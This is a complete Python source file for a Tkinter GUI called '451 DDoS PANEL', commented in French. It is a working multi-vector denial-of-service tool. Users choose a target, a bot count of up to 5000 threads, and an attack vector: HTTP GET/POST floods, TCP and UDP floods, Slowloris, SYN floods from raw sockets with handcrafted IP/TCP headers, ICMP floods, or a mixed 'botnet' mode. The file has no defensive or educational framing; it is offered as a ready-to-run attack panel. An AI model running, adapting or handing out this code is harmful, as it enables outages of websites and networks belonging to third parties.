# 451-panel-ddos-v1 - Description rapide du programme.
# Copyright (C) 2026 uhqtools-on
# This file is part of 451-panel-ddos-v1.
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
# See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program. If not, see https://www.gnu.org/licenses/.


"""
╔══════════════════════════════════════════════════════════════════╗
║         DDoS PANEL v2.0  —  Botnet multi-vecteur                 ║
║  Python 3.8+ / Tkinter / 100% stdlib (zéro dépendance)           ║
║                                                                  ║
║  Vecteurs : HTTP-GET, HTTP-POST, TCP, UDP, SLOWLORIS,            ║
║             SYN (raw), ICMP (raw), MIX (botnet multi-vecteur)    ║
║                                                                  ║
║  NOTE : SYN et ICMP utilisent des raw sockets -> lance le script ║
║  en root / administrateur. Sinon fallback automatique en TCP.    ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import queue
import random
import select
import socket
import struct
import threading
import time
import tkinter as tk
from collections import deque
from tkinter import ttk
from urllib.parse import urlparse

APP_NAME = "451 DDoS PANEL"
VERSION = "1.0"

# ─────────────── Thème ───────────────
BG      = "#0b0f14"
PANEL   = "#121821"
PANEL2  = "#1a2230"
FG      = "#d7e2ee"
FG_DIM  = "#7b8ea3"
ACCENT  = "#00e5a0"
ACCENT2 = "#00b3ff"
WARN    = "#ffb020"
DANGER  = "#ff4d5e"
GRID    = "#1e2a38"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/122.0 Mobile Safari/537.36",
]

VECTORS = [
    "HTTP-GET", "HTTP-POST", "TCP", "UDP", "SLOWLORIS",
    "SYN", "ICMP", "MIX (botnet)",
]
MIX_POOL = ["HTTP-GET", "HTTP-POST", "TCP", "UDP", "SLOWLORIS"]

MAX_LOG_LINES = 500
MAX_BOT_DOTS = 800



def _checksum(data: bytes) -> int:
    """Checksum Internet standard (RFC 1071)."""
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def build_ip_header(src: bytes, dst: bytes, proto: int, payload_len: int, ident: int) -> bytes:
    vihl, tos, ttl = 0x45, 0, 64
    total = 20 + payload_len
    hdr = struct.pack("!BBHHHBBH4s4s", vihl, tos, total, ident, 0x4000,
                      ttl, proto, 0, src, dst)
    chk = _checksum(hdr)
    return struct.pack("!BBHHHBBH4s4s", vihl, tos, total, ident, 0x4000,
                       ttl, proto, chk, src, dst)


def build_tcp_syn(src: bytes, dst: bytes, sport: int, dport: int, seq: int) -> bytes:
    offset_res, flags, window, urg = (5 << 4), 0x02, 5840, 0
    tcp = struct.pack("!HHLLBBHHH", sport, dport, seq, 0,
                      offset_res, flags, window, 0, urg)
    pseudo = struct.pack("!4s4sBBH", src, dst, 0, socket.IPPROTO_TCP, len(tcp))
    chk = _checksum(pseudo + tcp)
    return struct.pack("!HHLLBBHHH", sport, dport, seq, 0,
                       offset_res, flags, window, chk, urg)


def build_icmp_echo(seq: int, payload: bytes) -> bytes:
    ident = os.getpid() & 0xFFFF
    hdr = struct.pack("!BBHHH", 8, 0, 0, ident, seq)
    chk = _checksum(hdr + payload)
    hdr = struct.pack("!BBHHH", 8, 0, chk, ident, seq)
    return hdr + payload


def local_ip_for(target_ip: str) -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target_ip, 53))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()



class Stats:
    __slots__ = ("lock", "packets", "bytes", "errors", "bots_alive")

    def __init__(self):
        self.lock = threading.Lock()
        self.packets = 0
        self.bytes = 0
        self.errors = 0
        self.bots_alive = 0

    def add(self, packets=0, nbytes=0, errors=0):
        with self.lock:
            self.packets += packets
            self.bytes += nbytes
            self.errors += errors

    def snapshot(self):
        with self.lock:
            return self.packets, self.bytes, self.errors, self.bots_alive

    def reset(self):
        with self.lock:
            self.packets = self.bytes = self.errors = 0


class Config:
    __slots__ = ("ip", "port", "host_header", "path", "vector", "payload",
                 "conns", "keepalive", "burst", "src_ip", "raw_ok")

    def __init__(self, ip, port, host_header, path, vector, payload,
                 conns, keepalive, burst, src_ip, raw_ok):
        self.ip = ip
        self.port = port
        self.host_header = host_header
        self.path = path
        self.vector = vector
        self.payload = payload
        self.conns = conns
        self.keepalive = keepalive
        self.burst = burst
        self.src_ip = src_ip
        self.raw_ok = raw_ok



class AttackBot(threading.Thread):
    """Un nœud autonome de la botnet. Chaque bot possède son propre
    vecteur, ses compteurs locaux et un flush périodique vers Stats."""

    def __init__(self, bid, cfg, stop_event, stats, log_fn):
        super().__init__(daemon=True, name=f"451-bot-{bid}")
        self.bid = bid
        self.cfg = cfg
        self.stop = stop_event
        self.stats = stats
        self._log = log_fn

        # Un bot "MIX" tire un vecteur aléatoire -> botnet hétérogène
        if cfg.vector.startswith("MIX"):
            self.vector = random.choice(MIX_POOL)
        else:
            self.vector = cfg.vector

        self.sent_p = 0
        self.sent_b = 0
        self.err = 0
        self.alive = False
        self._last_flush = time.monotonic()

    def _flush(self, force=False):
        now = time.monotonic()
        if force or now - self._last_flush > 0.2:
            p, b, e = self.sent_p, self.sent_b, self.err
            if p or b or e:
                self.sent_p = self.sent_b = self.err = 0
                self.stats.add(p, b, e)
            self._last_flush = now

    def run(self):
        self.alive = True
        with self.stats.lock:
            self.stats.bots_alive += 1
        try:
            dispatch = {
                "HTTP-GET":  lambda: self._http(False),
                "HTTP-POST": lambda: self._http(True),
                "TCP":       self._tcp,
                "UDP":       self._udp,
                "SLOWLORIS": self._slowloris,
                "SYN":       self._syn,
                "ICMP":      self._icmp,
            }
            dispatch[self.vector]()
        except Exception as ex:
            self.err += 1
            if self.bid == 0:
                self._log(f"[bot 0] exception sur {self.vector}: {ex!r}")
        finally:
            self.alive = False
            with self.stats.lock:
                self.stats.bots_alive -= 1
            self._flush(force=True)


    def _http(self, post=False):
        ip, port = self.cfg.ip, self.cfg.port
        host, path, body = self.cfg.host_header, self.cfg.path, self.cfg.payload
        ua = random.choice(USER_AGENTS)
        clen = len(body)
        conns = []

        for _ in range(self.cfg.conns):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(2.0)
                s.connect((ip, port))
                s.setblocking(False)
                conns.append(s)
            except Exception:
                self.err += 1

        if not conns:
            time.sleep(0.05)
            return

        while not self.stop.is_set():
            for s in conns:
                try:
                    r = random.randint(0, 2 ** 31)
                    if post:
                        req = ("POST %s?r=%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
                               "Accept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\n"
                               "Content-Length: %d\r\nConnection: keep-alive\r\n\r\n"
                               % (path, r, host, ua, clen)).encode() + body
                    else:
                        req = ("GET %s?r=%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
                               "Accept: */*\r\nConnection: keep-alive\r\n\r\n"
                               % (path, r, host, ua)).encode()
                    s.send(req)
                    self.sent_p += 1
                    self.sent_b += len(req)
                except Exception:
                    self.err += 1
            # purge des buffers de réception -> évite le blocage TCP
            try:
                rd, _, _ = select.select(conns, [], [], 0)
                for s in rd:
                    try:
                        s.recv(8192)
                    except Exception:
                        pass
            except Exception:
                pass
            self._flush()

    def _tcp(self):
        ip, port, payload = self.cfg.ip, self.cfg.port, self.cfg.payload
        keep = self.cfg.keepalive
        s = None
        while not self.stop.is_set():
            try:
                if s is None:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    s.settimeout(2.0)
                    s.connect((ip, port))
                s.send(payload)
                self.sent_p += 1
                self.sent_b += len(payload)
                if not keep:
                    s.close()
                    s = None
            except Exception:
                self.err += 1
                try:
                    if s:
                        s.close()
                except Exception:
                    pass
                s = None
            self._flush()

    def _udp(self):
        ip, port, payload = self.cfg.ip, self.cfg.port, self.cfg.payload
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1 << 20)
        except Exception:
            pass
        dst = (ip, port)
        burst = max(1, self.cfg.burst)
        size = len(payload)
        while not self.stop.is_set():
            try:
                for _ in range(burst):
                    s.sendto(payload, dst)
                self.sent_p += burst
                self.sent_b += size * burst
            except Exception:
                self.err += 1
            self._flush()

    def _slowloris(self):
        ip, port = self.cfg.ip, self.cfg.port
        host, path = self.cfg.host_header, self.cfg.path
        ua = random.choice(USER_AGENTS)

        def open_one():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(3.0)
            s.connect((ip, port))
            s.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n"
                       % (path, host, ua)).encode())
            return s

        conns = []
        for _ in range(self.cfg.conns):
            try:
                conns.append(open_one())
            except Exception:
                self.err += 1

        while not self.stop.is_set():
            for s in list(conns):
                try:
                    s.sendall(("X-%d: %d\r\n"
                               % (random.randint(1, 9999), random.randint(1, 99999))).encode())
                    self.sent_p += 1
                except Exception:
                    self.err += 1
                    try:
                        s.close()
                    except Exception:
                        pass
                    conns.remove(s)
                    try:
                        conns.append(open_one())
                    except Exception:
                        pass
            self._flush()
            time.sleep(0.35)   

    def _syn(self):
        if not self.cfg.raw_ok:
            return self._tcp()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except Exception:
            return self._tcp()

        ip, port = self.cfg.ip, self.cfg.port
        src = socket.inet_aton(self.cfg.src_ip)
        dst = socket.inet_aton(ip)
        while not self.stop.is_set():
            try:
                pkt = build_ip_header(src, dst, socket.IPPROTO_TCP, 20,
                                      random.randint(0, 65535)) \
                    + build_tcp_syn(src, dst, random.randint(1024, 65535), port,
                                    random.randint(0, 0xFFFFFFFF))
                s.sendto(pkt, (ip, 0))
                self.sent_p += 1
                self.sent_b += len(pkt)
            except Exception:
                self.err += 1
            self._flush()

    def _icmp(self):
        if not self.cfg.raw_ok:
            return self._udp()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except Exception:
            return self._udp()

        ip = self.cfg.ip
        payload = (self.cfg.payload[:56] or b"451-panel")
        seq = 0
        while not self.stop.is_set():
            try:
                seq = (seq + 1) & 0xFFFF
                pkt = build_icmp_echo(seq, payload)
                s.sendto(pkt, (ip, 0))
                self.sent_p += 1
                self.sent_b += len(pkt) + 20
            except Exception:
                self.err += 1
            self._flush()



class Panel(tk.Tk):

    def __init__(self):
        super().__init__()
        self.title(f"{APP_NAME} v{VERSION}")
        self.geometry("1120x780")
        self.minsize(1000, 700)
        self.configure(bg=BG)

        self.stats = Stats()
        self.logq = queue.Queue()
        self.stop_event = threading.Event()
        self.bots = []
        self.running = False
        self.start_time = 0.0
        self.last_snap = (0, 0, 0)
        self.last_time = time.monotonic()
        self.history = deque(maxlen=140)
        self.peak_pps = 0.0

        self._build_style()
        self._build_ui()

        self.after(150, self._pump_logs)
        self.after(500, self._tick)
        self.protocol("WM_DELETE_WINDOW", self._on_close)
        self._log(f"{APP_NAME} v{VERSION} prêt. Renseigne une cible et lance la botnet.")

    # ── style ttk ──
    def _build_style(self):
        st = ttk.Style(self)
        try:
            st.theme_use("clam")
        except Exception:
            pass
        st.configure(".", background=BG, foreground=FG, fieldbackground=PANEL2)
        st.configure("TFrame", background=BG)
        st.configure("Card.TFrame", background=PANEL)
        st.configure("TLabel", background=PANEL, foreground=FG)
        st.configure("Dim.TLabel", background=PANEL, foreground=FG_DIM)
        st.configure("Title.TLabel", background=BG, foreground=ACCENT2,
                     font=("Consolas", 15, "bold"))
        st.configure("Stat.TLabel", background=PANEL, foreground=ACCENT,
                     font=("Consolas", 17, "bold"))
        st.configure("StatLbl.TLabel", background=PANEL, foreground=FG_DIM,
                     font=("Consolas", 8, "bold"))
        st.configure("TButton", background=PANEL2, foreground=FG,
                     borderwidth=0, focusthickness=0, padding=8)
        st.map("TButton", background=[("active", "#25324a")])
        st.configure("Go.TButton", background=ACCENT, foreground="#04140f",
                     font=("Consolas", 11, "bold"))
        st.map("Go.TButton", background=[("active", "#00ffb3")])
        st.configure("Stop.TButton", background=DANGER, foreground="#1a0407",
                     font=("Consolas", 11, "bold"))
        st.map("Stop.TButton", background=[("active", "#ff7d89")])
        st.configure("TCombobox", fieldbackground=PANEL2, background=PANEL2,
                     foreground=FG, arrowcolor=ACCENT)
        st.configure("TSpinbox", fieldbackground=PANEL2, background=PANEL2,
                     foreground=FG, arrowcolor=ACCENT)
        st.configure("TEntry", fieldbackground=PANEL2, foreground=FG,
                     insertcolor=ACCENT)
        st.configure("TCheckbutton", background=PANEL, foreground=FG)

    def _build_ui(self):
        head = tk.Frame(self, bg=BG, height=44)
        head.pack(fill="x", padx=12, pady=(10, 0))
        tk.Label(head, text="◆ 451 DDoS PANEL", bg=BG, fg=ACCENT2,
                 font=("Consolas", 15, "bold")).pack(side="left")
        tk.Label(head, text="botnet multi-vecteur  ·  raw sockets  ·  temps réel",
                 bg=BG, fg=FG_DIM, font=("Consolas", 9)).pack(side="left", padx=14)

        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True, padx=12, pady=8)

        left = tk.Frame(body, bg=PANEL, width=330)
        left.pack(side="left", fill="y", padx=(0, 10))
        left.pack_propagate(False)
        right = tk.Frame(body, bg=BG)
        right.pack(side="left", fill="both", expand=True)

        self._build_config(left)
        self._build_stats(right)
        self._build_graph(right)
        self._build_botnet(right)
        self._build_log(right)

    def _build_config(self, p):
        tk.Label(p, text="CONFIGURATION", bg=PANEL, fg=ACCENT2,
                 font=("Consolas", 10, "bold")).pack(anchor="w", padx=14, pady=(14, 8))

        def row(label):
            tk.Label(p, text=label, bg=PANEL, fg=FG_DIM,
                     font=("Consolas", 8, "bold")).pack(anchor="w", padx=14, pady=(7, 1))

        row("CIBLE  (IP / domaine / URL)")
        self.e_target = ttk.Entry(p, width=32)
        self.e_target.insert(0, "example.com")
        self.e_target.pack(padx=14, fill="x")

        f = tk.Frame(p, bg=PANEL)
        f.pack(padx=14, fill="x", pady=(6, 0))
        c1 = tk.Frame(f, bg=PANEL); c1.pack(side="left", fill="x", expand=True)
        c2 = tk.Frame(f, bg=PANEL); c2.pack(side="left", fill="x", expand=True, padx=(8, 0))
        tk.Label(c1, text="PORT", bg=PANEL, fg=FG_DIM, font=("Consolas", 8, "bold")).pack(anchor="w")
        self.e_port = ttk.Entry(c1, width=10); self.e_port.insert(0, "80"); self.e_port.pack(fill="x")
        tk.Label(c2, text="CHEMIN", bg=PANEL, fg=FG_DIM, font=("Consolas", 8, "bold")).pack(anchor="w")
        self.e_path = ttk.Entry(c2, width=14); self.e_path.insert(0, "/"); self.e_path.pack(fill="x")

        row("VECTEUR D'ATTAQUE")
        self.cb_vector = ttk.Combobox(p, values=VECTORS, state="readonly")
        self.cb_vector.set("HTTP-GET")
        self.cb_vector.pack(padx=14, fill="x")
        self.cb_vector.bind("<<ComboboxSelected>>", self._on_vector)

        row("NOMBRE DE BOTS")
        self.sp_bots = ttk.Spinbox(p, from_=1, to=5000, increment=10)
        self.sp_bots.set(50)
        self.sp_bots.pack(padx=14, fill="x")

        f2 = tk.Frame(p, bg=PANEL)
        f2.pack(padx=14, fill="x", pady=(6, 0))
        a = tk.Frame(f2, bg=PANEL); a.pack(side="left", fill="x", expand=True)
        b = tk.Frame(f2, bg=PANEL); b.pack(side="left", fill="x", expand=True, padx=(8, 0))
        tk.Label(a, text="CONNEXIONS/BOT", bg=PANEL, fg=FG_DIM, font=("Consolas", 8, "bold")).pack(anchor="w")
        self.sp_conns = ttk.Spinbox(a, from_=1, to=500, increment=1); self.sp_conns.set(8)
        self.sp_conns.pack(fill="x")
        tk.Label(b, text="PAYLOAD (octets)", bg=PANEL, fg=FG_DIM, font=("Consolas", 8, "bold")).pack(anchor="w")
        self.sp_payload = ttk.Spinbox(b, from_=1, to=65400, increment=64); self.sp_payload.set(1024)
        self.sp_payload.pack(fill="x")

        row("DURÉE EN SECONDES  (0 = infini)")
        self.e_dur = ttk.Entry(p, width=12); self.e_dur.insert(0, "30"); self.e_dur.pack(padx=14, fill="x")

        self.v_keep = tk.BooleanVar(value=False)
        ttk.Checkbutton(p, text="TCP keep-alive (reuse socket)",
                        variable=self.v_keep).pack(anchor="w", padx=12, pady=(10, 0))

        btns = tk.Frame(p, bg=PANEL)
        btns.pack(fill="x", padx=14, pady=16)
        self.b_start = ttk.Button(btns, text="▶  LANCER", style="Go.TButton",
                                  command=self.start_attack)
        self.b_start.pack(fill="x")
        self.b_stop = ttk.Button(btns, text="■  STOP", style="Stop.TButton",
                                 command=self.stop_attack, state="disabled")
        self.b_stop.pack(fill="x", pady=(8, 0))
        ttk.Button(btns, text="⟲  RESET STATS", command=self._reset).pack(fill="x", pady=(8, 0))

        self.lbl_status = tk.Label(p, text="● IDLE", bg=PANEL, fg=FG_DIM,
                                   font=("Consolas", 10, "bold"))
        self.lbl_status.pack(side="bottom", pady=14)

    def _build_stats(self, p):
        box = tk.Frame(p, bg=PANEL)
        box.pack(fill="x")
        self.stat_vars = {}
        specs = [("PPS", "paquets/s"), ("MBPS", "débit"), ("TOTAL", "paquets"),
                 ("DATA", "transféré"), ("ERREURS", "erreurs"), ("BOTS", "actifs")]
        for i, (key, sub) in enumerate(specs):
            cell = tk.Frame(box, bg=PANEL)
            cell.grid(row=0, column=i, sticky="nsew", padx=1, pady=8)
            box.columnconfigure(i, weight=1)
            var = tk.StringVar(value="0")
            tk.Label(cell, textvariable=var, bg=PANEL, fg=ACCENT,
                     font=("Consolas", 16, "bold")).pack()
            tk.Label(cell, text=f"{key}\n{sub}", bg=PANEL, fg=FG_DIM,
                     font=("Consolas", 7, "bold"), justify="center").pack()
            self.stat_vars[key] = var

    def _build_graph(self, p):
        wrap = tk.Frame(p, bg=PANEL)
        wrap.pack(fill="x", pady=(6, 0))
        top = tk.Frame(wrap, bg=PANEL)
        top.pack(fill="x")
        tk.Label(top, text="DÉBIT TEMPS RÉEL (paquets/s)", bg=PANEL, fg=FG_DIM,
                 font=("Consolas", 8, "bold")).pack(side="left", padx=10, pady=6)
        self.lbl_peak = tk.Label(top, text="pic: 0 pps", bg=PANEL, fg=WARN,
                                 font=("Consolas", 8, "bold"))
        self.lbl_peak.pack(side="right", padx=10)
        self.graph = tk.Canvas(wrap, height=130, bg="#080c11",
                               highlightthickness=0)
        self.graph.pack(fill="x", padx=6, pady=(0, 6))

    def _build_botnet(self, p):
        wrap = tk.Frame(p, bg=PANEL)
        wrap.pack(fill="x", pady=(6, 0))
        tk.Label(wrap, text="BOTNET — nœuds actifs", bg=PANEL, fg=FG_DIM,
                 font=("Consolas", 8, "bold")).pack(anchor="w", padx=10, pady=6)
        self.bot_canvas = tk.Canvas(wrap, height=96, bg="#080c11", highlightthickness=0)
        self.bot_canvas.pack(fill="x", padx=6, pady=(0, 6))

    def _build_log(self, p):
        wrap = tk.Frame(p, bg=PANEL)
        wrap.pack(fill="both", expand=True, pady=(6, 0))
        tk.Label(wrap, text="CONSOLE", bg=PANEL, fg=FG_DIM,
                 font=("Consolas", 8, "bold")).pack(anchor="w", padx=10, pady=6)
        inner = tk.Frame(wrap, bg=PANEL)
        inner.pack(fill="both", expand=True, padx=6, pady=(0, 6))
        self.txt = tk.Text(inner, bg="#080c11", fg=FG, insertbackground=ACCENT,
                           font=("Consolas", 9), wrap="word", height=9,
                           borderwidth=0, highlightthickness=0)
        self.txt.pack(side="left", fill="both", expand=True)
        sb = ttk.Scrollbar(inner, command=self.txt.yview)
        sb.pack(side="right", fill="y")
        self.txt.configure(yscrollcommand=sb.set, state="disabled")
        self.txt.tag_configure("ok", foreground=ACCENT)
        self.txt.tag_configure("warn", foreground=WARN)
        self.txt.tag_configure("err", foreground=DANGER)
        self.txt.tag_configure("info", foreground=ACCENT2)


    def _log(self, msg, tag="info"):
        self.logq.put((time.strftime("%H:%M:%S"), tag, msg))

    def _pump_logs(self):
        try:
            while True:
                ts, tag, msg = self.logq.get_nowait()
                self.txt.configure(state="normal")
                self.txt.insert("end", f"[{ts}] ", "info")
                self.txt.insert("end", f"{msg}\n", tag)
                lines = int(self.txt.index("end-1c").split(".")[0])
                if lines > MAX_LOG_LINES:
                    self.txt.delete("1.0", f"{lines - MAX_LOG_LINES}.0")
                self.txt.see("end")
                self.txt.configure(state="disabled")
        except queue.Empty:
            pass
        self.after(150, self._pump_logs)

    def _on_vector(self, _=None):
        v = self.cb_vector.get()
        if v == "SLOWLORIS":
            self.sp_conns.set(50)
            self.e_port.delete(0, "end"); self.e_port.insert(0, "80")
        elif v.startswith("HTTP"):
            self.sp_conns.set(8)
        elif v in ("SYN", "ICMP"):
            self._log("SYN/ICMP nécessitent des privilèges root/admin (raw sockets).")

    def _parse_target(self):
        raw = self.e_target.get().strip()
        if not raw:
            raise ValueError("cible vide")

        path = self.e_path.get().strip() or "/"
        host, port = raw, None
        if "://" in raw:
            u = urlparse(raw)
            host = u.hostname or raw
            if u.path:
                path = u.path
            port = u.port or (443 if u.scheme == "https" else 80)
        else:
            host = raw.split("/")[0]
            if ":" in host:
                host, p = host.rsplit(":", 1)
                if p.isdigit():
                    port = int(p)

        pfield = self.e_port.get().strip()
        if port is None:
            port = int(pfield) if pfield.isdigit() else 80

        ip = socket.gethostbyname(host)
        return host, ip, int(port), path

    def _raw_ok(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.close()
            return True
        except Exception:
            return False

    def start_attack(self):
        if self.running:
            return
        try:
            host, ip, port, path = self._parse_target()
            nbots = max(1, int(self.sp_bots.get()))
            conns = max(1, int(self.sp_conns.get()))
            payload_size = max(1, min(65400, int(self.sp_payload.get())))
            duration = max(0, int(self.e_dur.get() or 0))
        except Exception as ex:
            self._log(f"Configuration invalide : {ex}", "err")
            return

        vector = self.cb_vector.get()
        raw_ok = self._raw_ok()
        if vector in ("SYN", "ICMP") and not raw_ok:
            self._log("Raw sockets indisponibles -> fallback automatique TCP/UDP.", "warn")

        cfg = Config(
            ip=ip, port=port, host_header=host, path=path, vector=vector,
            payload=os.urandom(payload_size), conns=conns,
            keepalive=self.v_keep.get(), burst=16,
            src_ip=local_ip_for(ip), raw_ok=raw_ok,
        )

        self._log(f"Résolution {host} -> {ip}:{port}{path}")
        self._log(f"Déploiement de {nbots} bots · vecteur={vector} · conns/bot={conns}")

        self.stop_event = threading.Event()
        self.bots = [AttackBot(i, cfg, self.stop_event, self.stats, self._log)
                     for i in range(nbots)]

        self.stats.reset()
        self.history.clear()
        self.peak_pps = 0.0
        self.last_snap = (0, 0, 0)
        self.last_time = time.monotonic()
        self.start_time = time.monotonic()

        for b in self.bots:
            b.start()

        self.running = True
        self.b_start.configure(state="disabled")
        self.b_stop.configure(state="normal")
        self.lbl_status.configure(text="● ATTAQUE EN COURS", fg=ACCENT)
        self._log("Attaque lancée.", "ok")

        if duration > 0:
            self.after(duration * 1000, self.stop_attack)

    def stop_attack(self):
        if not self.running:
            return
        self.running = False
        self.stop_event.set()
        self.lbl_status.configure(text="● ARRÊT...", fg=WARN)
        self._log("Signal d'arrêt envoyé aux bots.", "warn")
        threading.Thread(target=self._reap, daemon=True).start()

    def _reap(self):
        for b in self.bots:
            try:
                b.join(timeout=2.5)
            except Exception:
                pass
        self.after(0, self._after_stop)

    def _after_stop(self):
        self.b_start.configure(state="normal")
        self.b_stop.configure(state="disabled")
        self.lbl_status.configure(text="● TERMINÉ", fg=DANGER)
        self._log("Tous les bots sont arrêtés.", "ok")

    def _reset(self):
        self.stats.reset()
        self.history.clear()
        self.peak_pps = 0.0
        self._log("Statistiques réinitialisées.")


    def _tick(self):
        now = time.monotonic()
        p, b, e, alive = self.stats.snapshot()
        lp, lb, _ = self.last_snap
        dt = max(1e-3, now - self.last_time)

        pps = (p - lp) / dt
        mbps = ((b - lb) * 8) / dt / 1_000_000
        self.last_snap = (p, b, e)
        self.last_time = now
        self.peak_pps = max(self.peak_pps, pps)

        self.stat_vars["PPS"].set(f"{pps:,.0f}")
        self.stat_vars["MBPS"].set(f"{mbps:.2f}")
        self.stat_vars["TOTAL"].set(f"{p:,}")
        self.stat_vars["DATA"].set(self._human(b))
        self.stat_vars["ERREURS"].set(f"{e:,}")
        self.stat_vars["BOTS"].set(f"{alive}/{len(self.bots)}")
        self.lbl_peak.configure(text=f"pic: {self.peak_pps:,.0f} pps")

        if self.running:
            self.history.append((now, pps))

        self._draw_graph()
        self._draw_bots()
        self.after(500, self._tick)

    @staticmethod
    def _human(n):
        for unit in ("o", "Ko", "Mo", "Go", "To"):
            if n < 1024:
                return f"{n:.1f} {unit}"
            n /= 1024
        return f"{n:.1f} Po"

    def _draw_graph(self):
        c = self.graph
        c.delete("all")
        w, h = c.winfo_width(), c.winfo_height()
        if w < 20:
            return
        for i in range(1, 5):
            y = h * i / 5
            c.create_line(0, y, w, y, fill=GRID)
        data = list(self.history)
        if len(data) < 2:
            c.create_text(w // 2, h // 2, text="en attente de trafic...",
                          fill=FG_DIM, font=("Consolas", 9))
            return
        mx = max(max(v for _, v in data), 1.0)
        n = len(data)
        pts = []
        for i, (_, v) in enumerate(data):
            x = w * i / (n - 1)
            y = h - 6 - (v / mx) * (h - 16)
            pts.extend([x, y])
        c.create_polygon(*([0, h] + pts + [w, h]), fill="#0d2b25", outline="")
        c.create_line(*pts, fill=ACCENT, width=2, smooth=True)
        c.create_text(8, 10, text=f"max {mx:,.0f} pps", anchor="w",
                      fill=WARN, font=("Consolas", 8, "bold"))

    def _draw_bots(self):
        c = self.bot_canvas
        c.delete("all")
        w, h = c.winfo_width(), c.winfo_height()
        if w < 20 or not self.bots:
            return
        n = min(len(self.bots), MAX_BOT_DOTS)
        cols = max(1, int(w // 9))
        size = 6
        for i in range(n):
            b = self.bots[i]
            x = 4 + (i % cols) * 9
            y = 4 + (i // cols) * 9
            if y > h - 8:
                break
            color = ACCENT if b.alive else DANGER
            c.create_rectangle(x, y, x + size, y + size,
                               fill=color, outline="")
        if len(self.bots) > MAX_BOT_DOTS:
            c.create_text(w - 6, h - 6, anchor="se",
                          text=f"+{len(self.bots) - MAX_BOT_DOTS} bots",
                          fill=FG_DIM, font=("Consolas", 7))

    def _on_close(self):
        try:
            self.stop_event.set()
        except Exception:
            pass
        self.destroy()


if __name__ == "__main__":
    Panel().mainloop()